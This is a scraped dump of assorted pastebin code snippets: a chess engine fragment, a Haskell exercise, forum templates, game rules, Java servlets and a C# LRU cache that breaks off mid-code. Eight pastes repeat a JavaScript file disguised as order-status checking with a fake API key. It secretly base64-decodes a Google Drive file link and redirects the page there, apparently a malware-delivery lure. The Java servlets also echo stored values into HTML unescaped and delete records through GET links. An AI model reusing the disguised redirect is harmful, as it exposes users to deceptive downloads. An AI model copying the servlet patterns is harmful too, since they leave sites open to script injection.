    s = cols[c1] + str(8 - r1) + cols[c2] + str(8 - r2)
    if promo:
        s += ""="" + promo.upper()
    if special == 'enpassant':
        s += "" e.p.""
    return s

###############################################################################
# Analýza pozice pro určení výsledku
###############################################################################

def analyze_position(board):
    """"""Analyzuje pozici a vrací výsledek.""""""
    # Zjistíme stranu na tahu
    side_to_move = board.to_move
    
    # Zjistíme, zda má strana na tahu legální tahy
    legal_moves = get_legal_moves(board, side_to_move)
    
    # Kontrola na mat nebo pat
    if not legal_moves:
        if is_in_check(board, side_to_move):
            if side_to_move == 'w':
                return ""Mat – černý vyhrává""
            else:
                return ""Mat – bílý vyhrává""
        else:
            return ""Pat (remíza)""
    
    # Zjistíme, zda po provedení tahu bude mat
    for move in legal_moves:
        make_move(move, board)
        opponent = 'b' if side_to_move == 'w' else 'w'
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves and is_in_check(board, opponent):
            undo_move(board)
            if side_to_move == 'w':
                return ""Mat v příštím tahu – bílý vyhrává""
            else:
                return ""Mat v příštím tahu – černý vyhrává""
        undo_move(board)
    
    # Pokud nemáme ani mat ani pat, pozice je otevřená
    return ""Pozice není rozhodnuta""

###############################################################################
# Hlavní program – inicializace z FEN a výpis optimální tahové sekvence
###############################################################################

def main():
    # Nastavíme pozici ze zadaného FEN
    fen = ""8/6A1/8/8/8/k1K5/8/8 w - - 0 1""
    fen = ""8/8/8/8/8/kq2K3/8/8 w - - 0 1""

    # Další příklad pozice
    #fen = ""8/8/8/8/8/kq2K3/6A1/8 w - - 0 1""
    
    # Nejprve spustíme debug pro ověření tahů krále
    print(""DEBUG TAHŮ KRÁLE:"")
    print(""-"" * 40)
    debug_king_moves(fen)
    print(""-"" * 40)
    
    board_obj = Board(fen)
    board = board_obj.copy()
    
    print(""Počáteční pozice:"")
    print(board.display())
    print(""\nVyhledávání optimální tahové sekvence – iterativní prohlubování...\n"")
    
    # Nastavíme časový limit na 5 minut (300 sekund)
    best_val, best_line, total_elapsed = iterative_deepening(board, max_depth=500, time_limit=inf)
    hrs = int(total_elapsed // 3600)
    mins = int((total_elapsed % 3600) // 60)
    secs = int(total_elapsed % 60)
    
    variant_board = board.copy()
    moves_notation = []
    print(""Postup tahů:"")
    print(""-""*40)
    print(""Start:"")
    print(variant_board.display())
    print(""-""*40)
    
    # Vykonání sekvence tahů a zobrazení průběhu
    for move in best_line:
        s = move_to_notation(move)
        moves_notation.append(s)
        make_move(move, variant_board)
        print(""Tah:"", s)
        print(variant_board.display())
        print(""-""*40)
    
    # Vyhodnocení výsledné pozice
    if best_val == inf:
        result_text = ""Mat – bílý vyhrává""
    elif best_val == -inf:
        result_text = ""Mat – černý vyhrává""
    else:
        # Pokud engine nenašel jednoznačný výsledek, analyzujeme pozici znovu
        result_text = analyze_position(variant_board)
    
    print(""Optimální tahová sekvence:"", "" "".join(moves_notation) if moves_notation else ""(žádný tah)"")
    print(""Výsledek:"", result_text)
    print(f""Celkový uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")

if __name__ == '__main__':
    main()"
yzfE2XNT,Ninety-Nine Haskell Problems: #9,banovski,Haskell,Monday 31st of March 2025 04:43:08 PM CDT,"-- Pack consecutive duplicates of list elements into sublists. If a
-- list contains repeated elements they should be placed in separate
-- sublists.

import Data.List (group)
-- ""group"" is imported as a reference function

main :: IO ()
main = do
  putStrLn ""Test strings: ""
  mapM_ print $ chunksOfFour testStringList
  putStrLn ""\nTested functions validity check: ""
  mapM_ (print . testFunction) testFuncList

testStringList :: [String]
testStringList = pure (\a b c d -> [a, b, c, d])
  <*> ""ab""
  <*> ""ab""
  <*> ""ab""
  <*> ""ab""

chunksOfFour :: [a] -> [[a]]
chunksOfFour [] = []
chunksOfFour lst = take 4 lst : chunksOfFour (drop 4 lst)

testFuncList :: Eq a => [[a] -> [[a]]]
testFuncList = [zero, one, two]

testFunction :: (String -> [String]) -> Bool
testFunction function =
  -- group from Data.List is used to produce reference results
  map function testStringList == map group testStringList

-- Functions were tested on a list with duplicates, 1000405 items
-- long. Time each function takes to complete the task is measured in
-- ticks.

-- 128 ticks
zero :: Eq a => [a] -> [[a]]
zero = group

-- 221 ticks
one :: Eq a => [a] -> [[a]]
one [] = []
one [a] = [[a]]
one lst = go [head lst] (tail lst)
  where
    go a [] = [a]
    go a (x:xs)
        | head a == x = go (a ++ [x]) xs
        | otherwise = a : go [x] xs

-- 285 ticks
two lst =
  let
    itemsAsLists = map (:[]) lst
    h = head itemsAsLists
    t = tail itemsAsLists
    join a [] = [a]
    join acc (x:xs)
      | head acc == head x = join (acc ++ x) xs
      | otherwise = acc : join x xs
  in
    join h t

-- Test strings: 
-- [""aaaa"",""aaab"",""aaba"",""aabb""]
-- [""abaa"",""abab"",""abba"",""abbb""]
-- [""baaa"",""baab"",""baba"",""babb""]
-- [""bbaa"",""bbab"",""bbba"",""bbbb""]

-- Tested functions validity check: 
-- True
-- True
-- True
"
x0eiuePM,Untitled,kammex,JavaScript,Monday 31st of March 2025 04:36:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/992/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1Zt7MdhG,04. Cita de Chat | Tablilla Administrativa,Athenea-Owl,HTML,Monday 31st of March 2025 04:35:41 PM CDT,"---------CITA DE CHAT | TABLILLA ADMINISTRATIVA PARA FORO MODERNBB----------

<center><div class=""athecdc4""><div class=""athecdc4s""><b>Registro Aceptado</b><i class=""fas fa-check-square""></i></div><div class=""athecdc4i"" style=""background-image: url(https://i.servimg.com/u/f81/19/51/91/06/xehc6410.jpg);""></div><div class=""athecdc4t""> Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
</div></div><a href=""https://athenea-owl.tumblr.com""><img style=""width:20px;"" src=""https://i.servimg.com/u/f81/19/51/91/06/athelo10.png""></a></center>
<style>.athecdc4{--4fondo: #222;--4fondo2: #000;--4globo: #333;--4texto: #fff;--4fuente: roboto;--4icono: green;} </style><link rel=""stylesheet"" href=""https://use.fontawesome.com/releases/v5.12.1/css/all.css"" crossorigin=""anonymous"">
<link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/q091bkkh63n81yglqrcu7/04.-Cita-de-Chat-Modernbb.css?rlkey=zmgd5jokyvaz3rpzx7tigbub0&st=1hqig6wo&"" crossorigin=""anonymous"">

---------CITA DE CHAT | TABLILLA ADMINISTRATIVA PARA FORO PHPBB----------

<center><div class=""athecdc4""><div class=""athecdc4s""><b>Registro Aceptado</b><i class=""fas fa-check-square""></i></div><div class=""athecdc4i"" style=""background-image: url(https://i.servimg.com/u/f81/19/51/91/06/xehc6410.jpg);""></div><div class=""athecdc4t""> Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
</div></div><a href=""https://athenea-owl.tumblr.com""><img style=""width:20px;"" src=""https://i.servimg.com/u/f81/19/51/91/06/athelo10.png""></a></center>
<style>.athecdc4{--4fondo: #222;--4fondo2: #000;--4globo: #333;--4texto: #fff;--4fuente: arial;--4icono: green;} </style><link rel=""stylesheet"" href=""https://use.fontawesome.com/releases/v5.12.1/css/all.css"" crossorigin=""anonymous"">
<link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/mu6iv9bi9d3lqsm7k36hh/04.Cita-de-Chat-Phpbb.css?rlkey=iu5zf0dcp9kq3goy0wvd8yuoa&st=f2mspt9d&"" crossorigin=""anonymous"">"
ZrKU7A2w,Market.js,kammex,JavaScript,Monday 31st of March 2025 03:49:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/740/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5Dp9QwNV,Untitled,kammex,JavaScript,Monday 31st of March 2025 03:34:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/080/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q1q3ZjkT,Products.js,kammex,JavaScript,Monday 31st of March 2025 03:18:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/240/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BFn8R32Q,Order.js,kammex,JavaScript,Monday 31st of March 2025 03:03:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/843/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WQGJdG2w,Untitled,kammex,JavaScript,Monday 31st of March 2025 02:32:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/479/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VMBYH47S,Don't disable place order button | Wcipi,alex91ckua,JavaScript,Monday 31st of March 2025 02:21:03 PM CDT,"document.querySelector("".woocommerce-checkout input#billing_phone"").addEventListener(""keyup"", function () {
  setTimeout( function(){ document.querySelector("".woocommerce #payment #place_order"").disabled = false; }, 500);
});"
KtmKWCxm,Products.js,kammex,JavaScript,Monday 31st of March 2025 02:17:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/245/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eFTB2nqc,RoboRallyRules.ts,puggan,TypeScript,Monday 31st of March 2025 02:08:56 PM CDT,"function roboRally()
{
    setUp();
    while(!winner()) {
        dealCards();
        placeCards();
        actOnPowerDown();
        for(let register = 1; register <= 5; register++) {
            revealCard(register);
            moveRobots(register);
            expressConveyorBelts();
            conveyorBelts();
            pushersPush();
            gearsRotate();
            fireLasers();
            verifyCheckpoints();
        }
        endOfTurnCleanUp();
    }
}

function actOnPowerDown() {
    players.forEach((player) => {
        if (player.robot.powerDown) {
            player.robot.damage = 0;
        }
        if (player.decideRequestPowerDown()) {
            player.requestedPowerDown = true;
        }
    });
}

function moveRobots(register: int) {
    players.map(
        (player) => {
            if (player.robot.dead) {
                return;
            }
            const card = player.getRegisterCard(register)
            if (player.robot.riskOfCollision(card.action)) {
                player.waitForPriority(card.priority);
            }
            player.robot.move(card.action);
        }
    );
}

function conveyorBeltMoment(spot: Spot) {
    if (spot.nextSpot.robot) {
        return;
    }
    spot.robot.moveTo(spot.nextSpot);
    if (!spot.nextSpot.isBelt()) {
        return;
    }
    if (spot.nextSpot.turnCW) {
        spot.robot.turnCW();
    }
    if (spot.nextSpot.turnCCW) {
        spot.robot.turnCCW();
    }
}

function expressConveyorBelts() {
    board
        .filter((spot) => spot.type === 'expressBelt' && spot.robot)
        .map(conveyorBeltMoment);
}

function conveyorBelts() {
    board
        .filter((spot) => (spot.type === 'expressBelt' || spot.type === 'belt') && spot.robot)
        .map(conveyorBeltMoment);
}

function pushersPush() {
    board
        .filter((spot) => spot.type === 'pusher' && spot.robot)
        .map((spot) => spot.robot.moveTo(spot.nextSpot));
}
function gearsRotate() {
    board
        .filter((spot) => spot.type === 'gear' && spot.robot)
        .map((spot) => spot.turnCW ? spot.robot.turnCW() : spot.robot.turnCCW());
}
function dealCards() {
    for(const player of players) {
        player.getCards(9 - player.robot.damage)
    }
}

function fireLasers() {
    const lasers = [
        ...board.filter((spot) => spot.type === 'laser').map((spot) => spot.laser),
        ...players.map((player) => player.robot.mainLaser)
    ]
    players.forEach((player) => {
        player.powerUps.filter((powerUp) => powerUp.type = 'laser').forEach((powerUp) => {
            lasers.push(powerUp.laser);
        })
    })
    lasers.forEach((laser) => laser.fire())
}

function verifyCheckpoints() {
    players.forEach((player) => {
        if (player.robot.dead) {
            return;
        }
        const robotSpot = player.robot.spot;
        if (!robotSpot || robotSpot.type === 'pit') {
            player.robot.dead = true;
            return;
        }
        if (robotSpot.type !== 'repair' && robotSpot.type !== 'flag') {
            return;
        }
        if (player.robot.damage > 0) {
            player.robot.damage--;
        }
        player.robot.setSpawn(robotSpot);
        if (robotSpot.type === 'flag' && robotSpot.flagNr === player.targetFlag) {
            player.targetFlag++;
        }
    })
}


function placeCards() {
    for(const player of players) {
        for(let registerIndex = 1; registerIndex <= 5; registerIndex++) {
            if (!player.registerIsLocked(registerIndex)) {
                player.putCard(registerIndex, player.cardDecision());
            }
        }
    }
}

function winner() {
    const winners = players.filter((player) => player.targetFlag > game.lastFlag);
    if (winners.length < 1) {
        return null;
    }
    return winners[0];
}

function endOfTurnCleanUp() {
    players.forEach((player) => {
        const robotSpot = player.robot.spot;
        if (robotSpot.type === 'repair' && robotSpot.dualWrench) {
            player.gainPowerUp();
        }

        for(let register = 1; register <= 5; register++) {
            if (!player.cardIsLocked(register)) {
                player.discardCard(register);
            }
        }

        if (player.requestedPowerDown) {
            player.robot.powerDown = true;
        } else if (player.robot.powerDown && player.decidePowerDownDone()) {
            player.robot.powerDown = false;
        }

        if (player.robot.dead) {
            player.robot.dead = false;
            player.robot.moveTo(player.robot.spawnSpot, player.decideDirection());
            player.robot.damage = 2;
            player.robot.powerDown = !player.decidePowerDownDone();
        }
    });
}
"
dd5jNEK8,Java Servlet CRUD+Search,stronk_8s,Java,Monday 31st of March 2025 02:07:33 PM CDT,"//CrimeBeans

package urvil.internal_exam;

import java.util.Collection;
import javax.ejb.Stateless;
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;

@Stateless
public class CrimeBeans implements CrimeBeansLocal {

    @PersistenceContext(unitName = ""my_persistence_unit"")
    EntityManager em;

    @Override
    public Collection<Crime> getAllCrimes() {
        return em.createNamedQuery(""Crime.findAll"").getResultList();
    }

    @Override
    public Crime getCrimeById(Integer id) {
        return em.find(Crime.class, id);
    }

    @Override
    public Crime getCrimeByLocation(String location) {
        return em.createNamedQuery(""Crime.findByLocation"", Crime.class)
                .setParameter(""location"", location).getSingleResult();
    }

    @Override
    public void addCrime(String location, String punishment) {
        Crime crime = new Crime();
        crime.setLocation(location);
        crime.setPunishment(punishment);
        em.persist(crime);
    }

    @Override
    public void updateCrime(Integer id, String location, String punishment) {
        Crime crime = em.find(Crime.class, id);
        crime.setLocation(location);
        crime.setPunishment(punishment);
        em.merge(crime);
    }

    @Override
    public void removeCrime(Integer id) {
        Crime crime = em.find(Crime.class, id);
        em.remove(crime);
    }

    // Add business logic below. (Right-click in editor and choose
    // ""Insert Code > Add Business Method"")
}


//Crimes-List-Servlet
package urvil.internal_exam;

import java.io.IOException;
import java.io.PrintWriter;
import java.util.Collection;
import javax.ejb.EJB;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = ""Crimes"", urlPatterns = {""/Crimes""})
public class Crimes extends HttpServlet {

    @EJB
    CrimeBeansLocal cbl;

    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType(""text/html;charset=UTF-8"");

        try (PrintWriter out = response.getWriter()) {
            /* TODO output your page here. You may use following sample code. */
            out.println(""<!DOCTYPE html>"");
            out.println(""<html>"");
            out.println(""<head>"");
            out.println(""<title>Servlet Crimes</title>"");
            out.println(""</head>"");
            out.println(""<body>"");
            out.println(""<a href='AddCrime'>Add Crime</a>"");
            out.println(""<form method='POST' action='SearchCrime'>""
                    + ""<input type='text' name='search'/>""
                    + ""<input type='submit' value='Submit'/></form>"");
            out.println(""<table><tr><th>Location</th><th>Punishment</th><th>Edit</th><th>Delete</th></tr>"");
            Collection<Crime> crimes = cbl.getAllCrimes();
            for (Crime c : crimes) {
                out.println(""<tr>"");
                out.println(""<td>"" + c.getLocation() + ""</td>"");
                out.println(""<td>"" + c.getPunishment() + ""</td>"");
                out.println(""<td><a href='UpdateCrime?id="" + c.getId() + ""'>Edit</a></td>"");
                out.println(""<td><a href='Crimes?delid="" + c.getId() + ""'>Delete</a></td>"");
                out.println(""</tr>"");
            }
            out.println(""</table>"");
            out.println(""<h1>Servlet Crimes at "" + request.getContextPath() + ""</h1>"");
            out.println(""</body>"");
            out.println(""</html>"");
        }
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String delId = request.getParameter(""delid"");
        if (delId != null) {
            cbl.removeCrime(Integer.parseInt(delId));
            response.sendRedirect(""Crimes"");
        } else {
            processRequest(request, response);
        }
    }
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    @Override
    public String getServletInfo() {
        return ""Short description"";
    }// </editor-fold>

}


//Update-Crime-Servlet
package urvil.internal_exam;

import java.io.IOException;
import java.io.PrintWriter;
import javax.ejb.EJB;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = ""UpdateCrime"", urlPatterns = {""/UpdateCrime""})
public class UpdateCrime extends HttpServlet {

    @EJB
    CrimeBeansLocal cbl;
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        int crimeId = Integer.parseInt(request.getParameter(""id""));
        Crime crime = cbl.getCrimeById(crimeId);
        try (PrintWriter out = response.getWriter()) {
            /* TODO output your page here. You may use following sample code. */
            out.println(""<!DOCTYPE html>"");
            out.println(""<html>"");
            out.println(""<head>"");
            out.println(""<title>Servlet UpdateCrime</title>"");
            out.println(""</head>"");
            out.println(""<body>"");
            out.println(""<form method='POST' action='UpdateCrime'>""
                    +""<input type='hidden' name='id' value='"" + crime.getId()+ ""'/>""
                    + ""Location<input type='text' name='location' value='"" + crime.getLocation() + ""'/><br>""
                    + ""Location<input type='text' name='punishment' value='"" + crime.getPunishment() + ""'/><br>""
                    + ""<input type='submit' value='Submit'/></form>"");
            out.println(""<h1>Servlet UpdateCrime at "" + request.getContextPath() + ""</h1>"");
            out.println(""</body>"");
            out.println(""</html>"");
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        int crimeId = Integer.parseInt(request.getParameter(""id""));
        String location = request.getParameter(""location"");
        String punishment = request.getParameter(""punishment"");
        if (location != null && punishment != null) {
            cbl.updateCrime(crimeId, location, punishment);
        }

        response.sendRedirect(""Crimes"");
    }
    @Override
    public String getServletInfo() {
        return ""Short description"";
    }// </editor-fold>

}


//Search-Crime-Servlet
package urvil.internal_exam;

import java.io.IOException;
import java.io.PrintWriter;
import javax.ejb.EJB;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = ""SearchCrime"", urlPatterns = {""/SearchCrime""})
public class SearchCrime extends HttpServlet {

    @EJB
    CrimeBeansLocal cbl;
    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

    }
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        response.setContentType(""text/html;charset=UTF-8"");
        String location = request.getParameter(""search"");
        Crime crime = cbl.getCrimeByLocation(location);

        try (PrintWriter out = response.getWriter()) {
            /* TODO output your page here. You may use following sample code. */
            out.println(""<!DOCTYPE html>"");
            out.println(""<html>"");
            out.println(""<head>"");
            out.println(""<title>Servlet SearchCrime</title>"");
            out.println(""</head>"");
            out.println(""<body>"");
            out.println(""<h1>Location: "" + crime.getLocation() + ""</h1>"");
            out.println(""<h2>Punishment: "" + crime.getPunishment() + ""</h2>"");
            out.println(""<a href='Crimes'>Go Back</a>"");
            out.println(""</body>"");
            out.println(""</html>"");
        }
    }
    @Override
    public String getServletInfo() {
        return ""Short description"";
    }// </editor-fold>

}
"
zgxGSpAt,Order.js,kammex,JavaScript,Monday 31st of March 2025 02:01:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/939/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uy1bZ6gV,LRU cache leetcode,Catsher,C#,Monday 31st of March 2025 01:48:35 PM CDT,"public class LRUCache
{
    public readonly int _capacity;

    private int _count = 0;

    private readonly Dictionary<int, OurNode> _keyToLinkToNode;
    private readonly OurLinkedList _queue = new();

    public LRUCache(int capacity)
    {
        _capacity = capacity;
        _keyToLinkToNode = new(_capacity + 1);
    }

    public int Get(int key)
    {
        if (!_keyToLinkToNode.TryGetValue(key, out OurNode? neededNode))
        {
            return -1;
        }

        var getValue = neededNode.Value.Value;

        _queue.ReplaceToEnd(neededNode);

        return getValue;
    }

    public void Put(int key, int value)
    {
        if (_keyToLinkToNode.TryGetValue(key, out OurNode existingNode))
        {
            existingNode.Value = KeyValuePair.Create(key, value);
            _queue.ReplaceToEnd(existingNode);
        }
        else
        {
            if (_capacity != _count)
            {
                _count++;
            }
            else
            {
                var nodeToDelete = _queue.First;
                _keyToLinkToNode.Remove(nodeToDelete.Value.Key);
                _queue.RemoveFirst();
            }

            _queue.AddLast(KeyValuePair.Create(key, value));
            var addedNode = _queue.Last;
            _keyToLinkToNode[key] = addedNode;
        }
    }
}

internal class OurLinkedList
{
    public OurNode First;
    public OurNode Last;

    public void ReplaceToEnd(OurNode node)
    {
        if (Last == node)
        {
            return;
        }
        else if (First == node)
        {
            First = First.Next;
            First.Previous = null!;

            node.Previous = Last;
            node.Next = null!;

            Last.Next = node;
            Last = node;
        }
        else
        {
            node.Previous.Next = node.Next;
            node.Next.Previous = node.Previous;

            node.Previous = Last;
            node.Next = null!;

            Last.Next = node;
            Last = node;
        }
    }

    public void RemoveFirst()
    {
        if (First == Last)
        {
            First = null!;
            Last = null!;
        }
        else
        {
            First = First.Next;
            First.Previous = null!;
        }
    }

    public void AddLast(KeyValuePair value)
    {
        OurNode newNode = new(value);

        if (Last == null)
        {
            First = newNode;
